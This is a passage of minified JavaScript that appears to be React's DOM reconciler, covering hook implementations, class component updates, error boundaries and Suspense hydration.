aL(u,d,p){u.flags|=16384,u={getSnapshot:d,value:p},d=Yt.updateQueue,d===null?(d=L5(),Yt.updateQueue=d,d.stores=[u]):(p=d.stores,p===null?d.stores=[u]:p.push(u))}function cL(u,d,p,g){d.value=p,d.getSnapshot=g,lL(d)&&dL(u)}function uL(u,d,p){return p(function(){lL(d)&&dL(u)})}function lL(u){var d=u.getSnapshot;u=u.value;try{var p=d();return!Ca(u,p)}catch{return!0}}function dL(u){var d=O0(u,2);d!==null&&Uo(d,u,2)}function cP(u){var d=io();if(typeof u=="function"){var p=u;if(u=p(),$0){Vi(!0);try{p()}finally{Vi(!1)}}}return d.memoizedState=d.baseState=u,d.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ed,lastRenderedState:u},d}function fL(u,d,p,g){return u.baseState=p,oP(u,rr,typeof g=="function"?g:Ed)}function rpe(u,d,p,g,D){if(q5(u))throw Error(r(485));if(u=d.action,u!==null){var F={payload:D,action:u,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(K){F.listeners.push(K)}};C.T!==null?p(!0):F.isTransition=!1,g(F),p=d.pending,p===null?(F.next=d.pending=F,hL(d,F)):(F.next=p.next,d.pending=p.next=F)}}function hL(u,d){var p=d.action,g=d.payload,D=u.state;if(d.isTransition){var F=C.T,K={};C.T=K;try{var te=p(D,g),ce=C.S;ce!==null&&ce(K,te),pL(u,d,te)}catch(Ae){uP(u,d,Ae)}finally{F!==null&&K.types!==null&&(F.types=K.types),C.T=F}}else try{F=p(D,g),pL(u,d,F)}catch(Ae){uP(u,d,Ae)}}function pL(u,d,p){p!==null&&typeof p=="object"&&typeof p.then=="function"?p.then(function(g){mL(u,d,g)},function(g){return uP(u,d,g)}):mL(u,d,p)}function mL(u,d,p){d.status="fulfilled",d.value=p,gL(d),u.state=p,d=u.pending,d!==null&&(p=d.next,p===d?u.pending=null:(p=p.next,d.next=p,hL(u,p)))}function uP(u,d,p){var g=u.pending;if(u.pending=null,g!==null){g=g.next;do d.status="rejected",d.reason=p,gL(d),d=d.next;while(d!==g)}u.action=null}function gL(u){u=u.listeners;for(var d=0;d<u.length;d++)(0,u[d])()}function yL(u,d){return d}function bL(u,d){if(gn){var p=ur.formState;if(p!==null){e:{var g=Yt;if(gn){if(Rr){t:{for(var D=Rr,F=gc;D.nodeType!==8;){if(!F){D=null;break t}if(D=bc(D.nextSibling),D===null){D=null;break t}}F=D.data,D=F==="F!"||F==="F"?D:null}if(D){Rr=bc(D.nextSibling),g=D.data==="F!";break e}}gh(g)}g=!1}g&&(d=p[0])}}return p=io(),p.memoizedState=p.baseState=d,g={pending:null,lanes:0,dispatch:null,lastRenderedReducer:yL,lastRenderedState:d},p.queue=g,p=ML.bind(null,Yt,g),g.dispatch=p,g=cP(!1),F=mP.bind(null,Yt,!1,g.queue),g=io(),D={state:d,dispatch:null,action:u,pending:null},g.queue=D,p=rpe.bind(null,Yt,D,F,p),D.dispatch=p,g.memoizedState=u,[d,p,!1]}function wL(u){var d=fi();return vL(d,rr,u)}function vL(u,d,p){if(d=oP(u,d,yL)[0],u=$5(Ed)[0],typeof d=="object"&&d!==null&&typeof d.then=="function")try{var g=Ww(d)}catch(K){throw K===jy?N5:K}else g=d;d=fi();var D=d.queue,F=D.dispatch;return p!==d.memoizedState&&(Yt.flags|=2048,$y(9,{destroy:void 0},ipe.bind(null,D,p),null)),[g,F,u]}function ipe(u,d){u.action=d}function EL(u){var d=fi(),p=rr;if(p!==null)return vL(d,p,u);fi(),d=d.memoizedState,p=fi();var g=p.queue.dispatch;return p.memoizedState=u,[d,g,!1]}function $y(u,d,p,g){return u={tag:u,create:p,deps:g,inst:d,next:null},d=Yt.updateQueue,d===null&&(d=L5(),Yt.updateQueue=d),p=d.lastEffect,p===null?d.lastEffect=u.next=u:(g=p.next,p.next=u,u.next=g,d.lastEffect=u),u}function _L(){return fi().memoizedState}function H5(u,d,p,g){var D=io();Yt.flags|=u,D.memoizedState=$y(1|d,{destroy:void 0},p,g===void 0?null:g)}function z5(u,d,p,g){var D=fi();g=g===void 0?null:g;var F=D.memoizedState.inst;rr!==null&&g!==null&&eP(g,rr.memoizedState.deps)?D.memoizedState=$y(d,F,p,g):(Yt.flags|=u,D.memoizedState=$y(1|d,F,p,g))}function AL(u,d){H5(8390656,8,u,d)}function lP(u,d){z5(2048,8,u,d)}function spe(u){Yt.flags|=4;var d=Yt.updateQueue;if(d===null)d=L5(),Yt.updateQueue=d,d.events=[u];else{var p=d.events;p===null?d.events=[u]:p.push(u)}}function CL(u){var d=fi().memoizedState;return spe({ref:d,nextImpl:u}),function(){if((Hn&2)!==0)throw Error(r(440));return d.impl.apply(void 0,arguments)}}function SL(u,d){return z5(4,2,u,d)}function TL(u,d){return z5(4,4,u,d)}function xL(u,d){if(typeof d=="function"){u=u();var p=d(u);return function(){typeof p=="function"?p():d(null)}}if(d!=null)return u=u(),d.current=u,function(){d.current=null}}function IL(u,d,p){p=p!=null?p.concat([u]):null,z5(4,4,xL.bind(null,d,u),p)}function dP(){}function RL(u,d){var p=fi();d=d===void 0?null:d;var g=p.memoizedState;return d!==null&&eP(d,g[1])?g[0]:(p.memoizedState=[u,d],u)}function PL(u,d){var p=fi();d=d===void 0?null:d;var g=p.memoizedState;if(d!==null&&eP(d,g[1]))return g[0];if(g=u(),$0){Vi(!0);try{u()}finally{Vi(!1)}}return p.memoizedState=[g,d],g}function fP(u,d,p){return p===void 0||(vd&1073741824)!==0&&(fn&261930)===0?u.memoizedState=d:(u.memoizedState=p,u=NF(),Yt.lanes|=u,Sh|=u,p)}function NL(u,d,p,g){return Ca(p,d)?p:Uy.current!==null?(u=fP(u,p,g),Ca(u,d)||(Ci=!0),u):(vd&42)===0||(vd&1073741824)!==0&&(fn&261930)===0?(Ci=!0,u.memoizedState=p):(u=NF(),Yt.lanes|=u,Sh|=u,d)}function OL(u,d,p,g,D){var F=j.p;j.p=F!==0&&8>F?F:8;var K=C.T,te={};C.T=te,mP(u,!1,d,p);try{var ce=D(),Ae=C.S;if(Ae!==null&&Ae(te,ce),ce!==null&&typeof ce=="object"&&typeof ce.then=="function"){var De=epe(ce,g);Gw(u,d,De,Pa(u))}else Gw(u,d,g,Pa(u))}catch(Le){Gw(u,d,{then:function(){},status:"rejected",reason:Le},Pa())}finally{j.p=F,K!==null&&te.types!==null&&(K.types=te.types),C.T=K}}function ope(){}function hP(u,d,p,g){if(u.tag!==5)throw Error(r(476));var D=kL(u).queue;OL(u,D,d,z,p===null?ope:function(){return DL(u),p(g)})}function kL(u){var d=u.memoizedState;if(d!==null)return d;d={memoizedState:z,baseState:z,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ed,lastRenderedState:z},next:null};var p={};return d.next={memoizedState:p,baseState:p,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Ed,lastRenderedState:p},next:null},u.memoizedState=d,u=u.alternate,u!==null&&(u.memoizedState=d),d}function DL(u){var d=kL(u);d.next===null&&(d=u.alternate.memoizedState),Gw(u,d.next.queue,{},Pa())}function pP(){return hs(lv)}function BL(){return fi().memoizedState}function jL(){return fi().memoizedState}function ape(u){for(var d=u.return;d!==null;){switch(d.tag){case 24:case 3:var p=Pa();u=wh(p);var g=vh(d,u,p);g!==null&&(Uo(g,d,p),Hw(g,d,p)),d={cache:zR()},u.payload=d;return}d=d.return}}function cpe(u,d,p){var g=Pa();p={lane:g,revertLane:0,gesture:null,action:p,hasEagerState:!1,eagerState:null,next:null},q5(u)?UL(d,p):(p=OR(u,d,p,g),p!==null&&(Uo(p,u,g),LL(p,d,g)))}function ML(u,d,p){var g=Pa();Gw(u,d,p,g)}function Gw(u,d,p,g){var D={lane:g,revertLane:0,gesture:null,action:p,hasEagerState:!1,eagerState:null,next:null};if(q5(u))UL(d,D);else{var F=u.alternate;if(u.lanes===0&&(F===null||F.lanes===0)&&(F=d.lastRenderedReducer,F!==null))try{var K=d.lastRenderedState,te=F(K,p);if(D.hasEagerState=!0,D.eagerState=te,Ca(te,K))return C5(u,d,D,0),ur===null&&A5(),!1}catch{}finally{}if(p=OR(u,d,D,g),p!==null)return Uo(p,u,g),LL(p,d,g),!0}return!1}function mP(u,d,p,g){if(g={lane:2,revertLane:GP(),gesture:null,action:g,hasEagerState:!1,eagerState:null,next:null},q5(u)){if(d)throw Error(r(479))}else d=OR(u,p,g,2),d!==null&&Uo(d,u,2)}function q5(u){var d=u.alternate;return u===Yt||d!==null&&d===Yt}function UL(u,d){Ly=M5=!0;var p=u.pending;p===null?d.next=d:(d.next=p.next,p.next=d),u.pending=d}function LL(u,d,p){if((p&4194048)!==0){var g=d.lanes;g&=u.pendingLanes,p|=g,d.lanes=p,ya(u,p)}}var Kw={readContext:hs,use:F5,useCallback:ei,useContext:ei,useEffect:ei,useImperativeHandle:ei,useLayoutEffect:ei,useInsertionEffect:ei,useMemo:ei,useReducer:ei,useRef:ei,useState:ei,useDebugValue:ei,useDeferredValue:ei,useTransition:ei,useSyncExternalStore:ei,useId:ei,useHostTransitionStatus:ei,useFormState:ei,useActionState:ei,useOptimistic:ei,useMemoCache:ei,useCacheRefresh:ei};Kw.useEffectEvent=ei;var FL={readContext:hs,use:F5,useCallback:function(u,d){return io().memoizedState=[u,d===void 0?null:d],u},useContext:hs,useEffect:AL,useImperativeHandle:function(u,d,p){p=p!=null?p.concat([u]):null,H5(4194308,4,xL.bind(null,d,u),p)},useLayoutEffect:function(u,d){return H5(4194308,4,u,d)},useInsertionEffect:function(u,d){H5(4,2,u,d)},useMemo:function(u,d){var p=io();d=d===void 0?null:d;var g=u();if($0){Vi(!0);try{u()}finally{Vi(!1)}}return p.memoizedState=[g,d],g},useReducer:function(u,d,p){var g=io();if(p!==void 0){var D=p(d);if($0){Vi(!0);try{p(d)}finally{Vi(!1)}}}else D=d;return g.memoizedState=g.baseState=D,u={pending:null,lanes:0,dispatch:null,lastRenderedReducer:u,lastRenderedState:D},g.queue=u,u=u.dispatch=cpe.bind(null,Yt,u),[g.memoizedState,u]},useRef:function(u){var d=io();return u={current:u},d.memoizedState=u},useState:function(u){u=cP(u);var d=u.queue,p=ML.bind(null,Yt,d);return d.dispatch=p,[u.memoizedState,p]},useDebugValue:dP,useDeferredValue:function(u,d){var p=io();return fP(p,u,d)},useTransition:function(){var u=cP(!1);return u=OL.bind(null,Yt,u.queue,!0,!1),io().memoizedState=u,[!1,u]},useSyncExternalStore:function(u,d,p){var g=Yt,D=io();if(gn){if(p===void 0)throw Error(r(407));p=p()}else{if(p=d(),ur===null)throw Error(r(349));(fn&127)!==0||aL(g,d,p)}D.memoizedState=p;var F={value:p,getSnapshot:d};return D.queue=F,AL(uL.bind(null,g,F,u),[u]),g.flags|=2048,$y(9,{destroy:void 0},cL.bind(null,g,F,p,d),null),p},useId:function(){var u=io(),d=ur.identifierPrefix;if(gn){var p=ml,g=pl;p=(g&~(1<<32-br(g)-1)).toString(32)+p,d="_"+d+"R_"+p,p=U5++,0<p&&(d+="H"+p.toString(32)),d+="_"}else p=tpe++,d="_"+d+"r_"+p.toString(32)+"_";return u.memoizedState=d},useHostTransitionStatus:pP,useFormState:bL,useActionState:bL,useOptimistic:function(u){var d=io();d.memoizedState=d.baseState=u;var p={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return d.queue=p,d=mP.bind(null,Yt,!0,p),p.dispatch=d,[u,d]},useMemoCache:sP,useCacheRefresh:function(){return io().memoizedState=ape.bind(null,Yt)},useEffectEvent:function(u){var d=io(),p={impl:u};return d.memoizedState=p,function(){if((Hn&2)!==0)throw Error(r(440));return p.impl.apply(void 0,arguments)}}},gP={readContext:hs,use:F5,useCallback:RL,useContext:hs,useEffect:lP,useImperativeHandle:IL,useInsertionEffect:SL,useLayoutEffect:TL,useMemo:PL,useReducer:$5,useRef:_L,useState:function(){return $5(Ed)},useDebugValue:dP,useDeferredValue:function(u,d){var p=fi();return NL(p,rr.memoizedState,u,d)},useTransition:function(){var u=$5(Ed)[0],d=fi().memoizedState;return[typeof u=="boolean"?u:Ww(u),d]},useSyncExternalStore:oL,useId:BL,useHostTransitionStatus:pP,useFormState:wL,useActionState:wL,useOptimistic:function(u,d){var p=fi();return fL(p,rr,u,d)},useMemoCache:sP,useCacheRefresh:jL};gP.useEffectEvent=CL;var $L={readContext:hs,use:F5,useCallback:RL,useContext:hs,useEffect:lP,useImperativeHandle:IL,useInsertionEffect:SL,useLayoutEffect:TL,useMemo:PL,useReducer:aP,useRef:_L,useState:function(){return aP(Ed)},useDebugValue:dP,useDeferredValue:function(u,d){var p=fi();return rr===null?fP(p,u,d):NL(p,rr.memoizedState,u,d)},useTransition:function(){var u=aP(Ed)[0],d=fi().memoizedState;return[typeof u=="boolean"?u:Ww(u),d]},useSyncExternalStore:oL,useId:BL,useHostTransitionStatus:pP,useFormState:EL,useActionState:EL,useOptimistic:function(u,d){var p=fi();return rr!==null?fL(p,rr,u,d):(p.baseState=u,[u,p.queue.dispatch])},useMemoCache:sP,useCacheRefresh:jL};$L.useEffectEvent=CL;function yP(u,d,p,g){d=u.memoizedState,p=p(g,d),p=p==null?d:h({},d,p),u.memoizedState=p,u.lanes===0&&(u.updateQueue.baseState=p)}var bP={enqueueSetState:function(u,d,p){u=u._reactInternals;var g=Pa(),D=wh(g);D.payload=d,p!=null&&(D.callback=p),d=vh(u,D,g),d!==null&&(Uo(d,u,g),Hw(d,u,g))},enqueueReplaceState:function(u,d,p){u=u._reactInternals;var g=Pa(),D=wh(g);D.tag=1,D.payload=d,p!=null&&(D.callback=p),d=vh(u,D,g),d!==null&&(Uo(d,u,g),Hw(d,u,g))},enqueueForceUpdate:function(u,d){u=u._reactInternals;var p=Pa(),g=wh(p);g.tag=2,d!=null&&(g.callback=d),d=vh(u,g,p),d!==null&&(Uo(d,u,p),Hw(d,u,p))}};function HL(u,d,p,g,D,F,K){return u=u.stateNode,typeof u.shouldComponentUpdate=="function"?u.shouldComponentUpdate(g,F,K):d.prototype&&d.prototype.isPureReactComponent?!Dw(p,g)||!Dw(D,F):!0}function zL(u,d,p,g){u=d.state,typeof d.componentWillReceiveProps=="function"&&d.componentWillReceiveProps(p,g),typeof d.UNSAFE_componentWillReceiveProps=="function"&&d.UNSAFE_componentWillReceiveProps(p,g),d.state!==u&&bP.enqueueReplaceState(d,d.state,null)}function H0(u,d){var p=d;if("ref"in d){p={};for(var g in d)g!=="ref"&&(p[g]=d[g])}if(u=u.defaultProps){p===d&&(p=h({},p));for(var D in u)p[D]===void 0&&(p[D]=u[D])}return p}function qL(u){_5(u)}function VL(u){console.error(u)}function WL(u){_5(u)}function V5(u,d){try{var p=u.onUncaughtError;p(d.value,{componentStack:d.stack})}catch(g){setTimeout(function(){throw g})}}function GL(u,d,p){try{var g=u.onCaughtError;g(p.value,{componentStack:p.stack,errorBoundary:d.tag===1?d.stateNode:null})}catch(D){setTimeout(function(){throw D})}}function wP(u,d,p){return p=wh(p),p.tag=3,p.payload={element:null},p.callback=function(){V5(u,d)},p}function KL(u){return u=wh(u),u.tag=3,u}function ZL(u,d,p,g){var D=p.type.getDerivedStateFromError;if(typeof D=="function"){var F=g.value;u.payload=function(){return D(F)},u.callback=function(){GL(d,p,g)}}var K=p.stateNode;K!==null&&typeof K.componentDidCatch=="function"&&(u.callback=function(){GL(d,p,g),typeof D!="function"&&(Th===null?Th=new Set([this]):Th.add(this));var te=g.stack;this.componentDidCatch(g.value,{componentStack:te!==null?te:""})})}function upe(u,d,p,g,D){if(p.flags|=32768,g!==null&&typeof g=="object"&&typeof g.then=="function"){if(d=p.alternate,d!==null&&ky(d,p,D,!0),p=Ta.current,p!==null){switch(p.tag){case 31:case 13:return yc===null?r3():p.alternate===null&&ti===0&&(ti=3),p.flags&=-257,p.flags|=65536,p.lanes=D,g===O5?p.flags|=16384:(d=p.updateQueue,d===null?p.updateQueue=new Set([g]):d.add(g),qP(u,g,D)),!1;case 22:return p.flags|=65536,g===O5?p.flags|=16384:(d=p.updateQueue,d===null?(d={transitions:null,markerInstances:null,retryQueue:new Set([g])},p.updateQueue=d):(p=d.retryQueue,p===null?d.retryQueue=new Set([g]):p.add(g)),qP(u,g,D)),!1}throw Error(r(435,p.tag))}return qP(u,g,D),r3(),!1}if(gn)return d=Ta.current,d!==null?((d.flags&65536)===0&&(d.flags|=256),d.flags|=65536,d.lanes=D,g!==UR&&(u=Error(r(422),{cause:g}),Mw(hc(u,p)))):(g!==UR&&(d=Error(r(423),{cause:g}),Mw(hc(d,p))),u=u.current.alternate,u.flags|=65536,D&=-D,u.lanes|=D,g=hc(g,p),D=wP(u.stateNode,g,D),ZR(u,D),ti!==4&&(ti=2)),!1;var F=Error(r(520),{cause:g});if(F=hc(F,p),nv===null?nv=[F]:nv.push(F),ti!==4&&(ti=2),d===null)return!0;g=hc(g,p),p=d;do{switch(p.tag){case 3:return p.flags|=65536,u=D&-D,p.lanes|=u,u=wP(p.stateNode,g,u),ZR(p,u),!1;case 1:if(d=p.type,F=p.stateNode,(p.flags&128)===0&&(typeof d.getDerivedStateFromError=="function"||F!==null&&typeof F.componentDidCatch=="function"&&(Th===null||!Th.has(F))))return p.flags|=65536,D&=-D,p.lanes|=D,D=KL(D),ZL(D,u,p,g),ZR(p,D),!1}p=p.return}while(p!==null);return!1}var vP=Error(r(461)),Ci=!1;function ps(u,d,p,g){d.child=u===null?XU(d,null,p,g):F0(d,u.child,p,g)}function YL(u,d,p,g,D){p=p.render;var F=d.ref;if("ref"in g){var K={};for(var te in g)te!=="ref"&&(K[te]=g[te])}else K=g;return j0(d),g=tP(u,d,p,K,F,D),te=nP(),u!==null&&!Ci?(rP(u,d,D),_d(u,d,D)):(gn&&te&&jR(d),d.flags|=1,ps(u,d,g,D),d.child)}function QL(u,d,p,g,D){if(u===null){var F=p.type;return typeof F=="function"&&!kR(F)&&F.defaultProps===void 0&&p.compare===null?(d.tag=15,d.type=F,JL(u,d,F,g,D)):(u=T5(p.type,null,g,d,d.mode,D),u.ref=d.ref,u.return=d,d.child=u)}if(F=u.child,!IP(u,D)){var K=F.memoizedProps;if(p=p.compare,p=p!==null?p:Dw,p(K,g)&&u.ref===d.ref)return _d(u,d,D)}return d.flags|=1,u=gd(F,g),u.ref=d.ref,u.return=d,d.child=u}function JL(u,d,p,g,D){if(u!==null){var F=u.memoizedProps;if(Dw(F,g)&&u.ref===d.ref)if(Ci=!1,d.pendingProps=g=F,IP(u,D))(u.flags&131072)!==0&&(Ci=!0);else return d.lanes=u.lanes,_d(u,d,D)}return EP(u,d,p,g,D)}function XL(u,d,p,g){var D=g.children,F=u!==null?u.memoizedState:null;if(u===null&&d.stateNode===null&&(d.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),g.mode==="hidden"){if((d.flags&128)!==0){if(F=F!==null?F.baseLanes|p:p,u!==null){for(g=d.child=u.child,D=0;g!==null;)D=D|g.lanes|g.childLanes,g=g.sibling;g=D&~F}else g=0,d.child=null;return eF(u,d,F,p,g)}if((p&536870912)!==0)d.memoizedState={baseLanes:0,cachePool:null},u!==null&&P5(d,F!==null?F.cachePool:null),F!==null?nL(d,F):QR(),rL(d);else return g=d.lanes=536870912,eF(u,d,F!==null?F.baseLanes|p:p,p,g)}else F!==null?(P5(d,F.cachePool),nL(d,F),_h(),d.memoizedState=null):(u!==null&&P5(d,null),QR(),_h());return ps(u,d,D,p),d.child}function Zw(u,d){return u!==null&&u.tag===22||d.stateNode!==null||(d.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),d.sibling}function eF(u,d,p,g,D){var F=VR();return F=F===null?null:{parent:_i._currentValue,pool:F},d.memoizedState={baseLanes:p,cachePool:F},u!==null&&P5(d,null),QR(),rL(d),u!==null&&ky(u,d,g,!0),d.childLanes=D,null}function W5(u,d){return d=K5({mode:d.mode,children:d.children},u.mode),d.ref=u.ref,u.child=d,d.return=u,d}function tF(u,d,p){return F0(d,u.child,null,p),u=W5(d,d.pendingProps),u.flags|=2,xa(d),d.memoizedState=null,u}function lpe(u,d,p){var g=d.pendingProps,D=(d.flags&128)!==0;if(d.flags&=-129,u===null){if(gn){if(g.mode==="hidden")return u=W5(d,g),d.lanes=536870912,Zw(null,u);if(XR(d),(u=Rr)?(u=h$(u,gc),u=u!==null&&u.data==="&"?u:null,u!==null&&(d.memoizedState={dehydrated:u,treeContext:ph!==null?{id:pl,overflow:ml}:null,retryLane:536870912,hydrationErrors:null},p=UU(u),p.return=d,d.child=p,fs=d,Rr=null)):u=null,u===null)throw gh(d);return d.lanes=536870912,null}return W5(d,g)}var F=u.memoizedState;if(F!==null){var K=F.dehydrated;if(XR(d),D)if(d.flags&256)d.flags&=-257,d=tF(u,d,p);else if(d.memoizedState!==null)d.child=u.child,d.flags|=128,d=null;else throw Error(r(558));else if(Ci||ky(u,d,p,!1),D=(p&u.childLanes)!==0,Ci||D){if(g=ur,g!==null&&(K=ba(g,p),K!==0&&K!==F.retryLane))throw F.retryLane=K,O0(u,K),Uo(g,u,K),vP;r3(),d=tF(u,d,p)}else u=F.treeContext,Rr=bc(K.nextSibling),fs=d,gn=!0,mh=null,gc=!1,u!==null&&$U(d,u),d=W5(d,g),d.flags|=4096;return d}return u=gd(u.child,{mode:g.mode,children:g.children}),u.ref=d.ref,d.child=u,u.return=d,u}function G5(u,d){var p=d.ref;if(p===null)u!==null&&u.ref!==null&&(d.flags|=4194816);else{if(typeof p!="function"&&typeof p!="object")throw Error(r(284));(u===null||u.ref!==p)&&(d.flags|=4194816)}}function EP(u,d,p,g,D){return j0(d),p=tP(u,d,p,g,void 0,D),g=nP(),u!==null&&!Ci?(rP(u,d,D),_d(u,d,D)):(gn&&g&&jR(d),d.flags|=1,ps(u,d,p,D),d.child)}function nF(u,d,p,g,D,F){return j0(d),d.updateQueue=null,p=sL(d,g,p,D),iL(u),g=nP(),u!==null&&!Ci?(rP(u,d,F),_d(u,d,F)):(gn&&g&&jR(d),d.flags|=1,ps(u,d,p,F),d.child)}function rF(u,d,p,g,D){if(j0(d),d.stateNode===null){var F=Ry,K=p.contextType;typeof K=="object"&&K!==null&&(F=hs(K)),F=new p(g,F),d.memoizedState=F.state!==null&&F.state!==void 0?F.state:null,F.updater=bP,d.stateNode=F,F._reactInternals=d,F=d.stateNode,F.props=g,F.state=d.memoizedState,F.refs={},GR(d),K=p.contextType,F.context=typeof K=="object"&&K!==null?hs(K):Ry,F.state=d.memoizedState,K=p.getDerivedStateFromProps,typeof K=="function"&&(yP(d,p,K,g),F.state=d.memoizedState),typeof p.getDerivedStateFromProps=="function"||typeof F.getSnapshotBeforeUpdate=="function"||typeof F.UNSAFE_componentWillMount!="function"&&typeof F.componentWillMount!="function"||(K=F.state,typeof F.componentWillMount=="function"&&F.componentWillMount(),typeof F.UNSAFE_componentWillMount=="function"&&F.UNSAFE_componentWillMount(),K!==F.state&&bP.enqueueReplaceState(F,F.state,null),qw(d,g,F,D),zw(),F.state=d.memoizedState),typeof F.componentDidMount=="function"&&(d.flags|=4194308),g=!0}else if(u===null){F=d.stateNode;var te=d.memoizedProps,ce=H0(p,te);F.props=ce;var Ae=F.context,De=p.contextType;K=Ry,typeof De=="object"&&De!==null&&(K=hs(De));var Le=p.getDerivedStateFromProps;De=typeof Le=="function"||typeof F.getSnapshotBeforeUpdate=="function",te=d.pendingProps!==te,De||typeof F.UNSAFE_componentWillReceiveProps!="function"&&typeof F.componentWillReceiveProps!="function"||(te||Ae!==K)&&zL(d,F,g,K),bh=!1;var Se=d.memoizedState;F.state=Se,qw(d,g,F,D),zw(),Ae=d.memoizedState,te||Se!==Ae||bh?(typeof Le=="function"&&(yP(d,p,Le,g),Ae=d.memoizedState),(ce=bh||HL(d,p,ce,g,Se,Ae,K))?(De||typeof F.UNSAFE_componentWillMount!="function"&&typeof F.componentWillMount!="function"||(typeof F.componentWillMount=="function"&&F.componentWillMount(),typeof F.UNSAFE_componentWillMount=="function"&&F.UNSAFE_componentWillMount()),typeof F.componentDidMount=="function"&&(d.flags|=4194308)):(typeof F.componentDidMount=="function"&&(d.flags|=4194308),d.memoizedProps=g,d.memoizedState=Ae),F.props=g,F.state=Ae,F.context=K,g=ce):(typeof F.componentDidMount=="function"&&(d.flags|=4194308),g=!1)}else{F=d.stateNode,KR(u,d),K=d.memoizedProps,De=H0(p,K),F.props=De,Le=d.pendingProps,Se=F.context,Ae=p.contextType,ce=Ry,typeof Ae=="object"&&Ae!==null&&(ce=hs(Ae)),te=p.getDerivedStateFromProps,(Ae=typeof te=="function"||typeof F.getSnapshotBeforeUpdate=="function")||typeof F.UNSAFE_componentWillReceiveProps!="function"&&typeof F.componentWillReceiveProps!="function"||(K!==Le||Se!==ce)&&zL(d,F,g,ce),bh=!1,Se=d.memoizedState,F.state=Se,qw(d,g,F,D),zw();var Pe=d.memoizedState;K!==Le||Se!==Pe||bh||u!==null&&u.dependencies!==null&&I5(u.dependencies)?(typeof te=="function"&&(yP(d,p,te,g),Pe=d.memoizedState),(De=bh||HL(d,p,De,g,Se,Pe,ce)||u!==null&&u.dependencies!==null&&I5(u.dependencies))?(Ae||typeof F.UNSAFE_componentWillUpdate!="function"&&typeof F.componentWillUpdate!="function"||(typeof F.componentWillUpdate=="function"&&F.componentWillUpdate(g,Pe,ce),typeof F.UNSAFE_componentWillUpdate=="function"&&F.UNSAFE_componentWillUpdate(g,Pe,ce)),typeof F.componentDidUpdate=="function"&&(d.flags|=4),typeof F.getSnapshotBeforeUpdate=="function"&&(d.flags|=1024)):(typeof F.componentDidUpdate!="function"||K===u.memoizedProps&&Se===u.memoizedState||(d.flags|=4),typeof F.getSnapshotBeforeUpdate!="function"||K===u.memoizedProps&&Se===u.memoizedState||(d.flags|=1024),d.memoizedProps=g,d.memoizedState=Pe),F.props=g,F.state=Pe,F.context=ce,g=De):(typeof F.componentDidUpdate!="function"||K===u.memoizedProps&&Se===u.memoizedState||(d.flags|=4),typeof F.getSnapshotBeforeUpdate!="function"||K===u.memoizedProps&&Se===u.memoizedState||(d.flags|=1024),g=!1)}return F=g,G5(u,d),g=(d.flags&128)!==0,F||g?(F=d.stateNode,p=g&&typeof p.getDerivedStateFromError!="function"?null:F.render(),d.flags|=1,u!==null&&g?(d.child=F0(d,u.child,null,D),d.child=F0(d,null,p,D)):ps(u,d,p,D),d.memoizedState=F.state,u=d.child):u=_d(u,d,D),u}function iF(u,d,p,g){return D0(),d.flags|=256,ps(u,d,p,g),d.child}var _P={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function AP(u){return{baseLanes:u,cachePool:GU()}}function CP(u,d,p){return u=u!==null?u.childLanes&~p:0,d&&(u|=Ra),u}function sF(u,d,p){var g=d.pendingProps,D=!1,F=(d.flags&128)!==0,K;if((K=F)||(K=u!==null&&u.memoizedState===null?!1:(di.current&2)!==0),K&&(D=!0,d.flags&=-129),K=(d.flags&32)!==0,d.flags&=-33,u===null){if(gn){if(D?Eh(d):_h(),(u=Rr)?(u=h$(u,gc),u=u!==null&&u.data!=="&"?u:null,u!==null&&(d.memoizedState={dehydrated:u,treeContext:ph!==null?{id:pl,overflow:ml}:null,retryLane:536870912,hydrationErrors:null},p=UU(u),p.return=d,d.child=p,fs=d,Rr=null)):u=null,u===null)throw gh(d);return oN(u)?d.lanes=32:d.lanes=536870912,null}var te=g.children;return g=g.fallback,D?(_h(),D=d.mode,te=K5({mode:"hidden",children:te},D),g=k0(g,D,p,null),te.return=d,g.return=d,te.sibling=g,d.child=te,g=d.child,g.memoizedState=AP(p),g.childLanes=CP(u,K,p),d.memoizedState=_P,Zw(null,g)):(Eh(d),SP(d,te))}var ce=u.memoizedState;if(ce!==null&&(te=ce.dehydrated,te!==null)){if(F)d.flags&256?(Eh(d),d.flags&=-257,d=TP(u,d,p)):d.memoizedState!==null?(_h(),d.child=u.child,d.flags|=128,d=null):(_h(),te=g.fallback,D=d.mode,g=K5({mode:"visible",children:g.children},D),te=k0(te,D,p,null),te.flags|=2,g.return=d,te.return=d,g.sibling=te,d.child=g,F0(d,u.child,null,p),g=d.child,g.memoizedState=AP(p),g.childLanes=CP(u,K,p),d.memoizedState=_P,d=Zw(null,g));else if(Eh(d),oN(te)){if(K=te.nextSibling&&te.nextSibling.dataset,K)var Ae=K.dgst;K=Ae,g=Error(r(419)),g.stack="",g.digest=K,Mw({value:g,source:null,stack:null}),d=TP(u,d,p)}else if(Ci||ky(u,d,p,!1),K=(p&u.childLanes)!==0,Ci||K){if(K=ur,K!==null&&(g=ba(K,p),g!==0&&g!==ce.retryLane))throw ce.retryLane=g,O0(u,g),Uo(K,u,g),vP;sN(te)||r3(),d=TP(u,d,p)}else sN(te)?(d.flags|=192,d.child=u.child,d=null):(u=ce.treeContext,Rr=bc(te.nextSibling),fs=d,gn=!0,mh=null,gc=!1,u!==null&&$U(d,u),d=SP(d,g.children),d.flags|=4096);return d}return 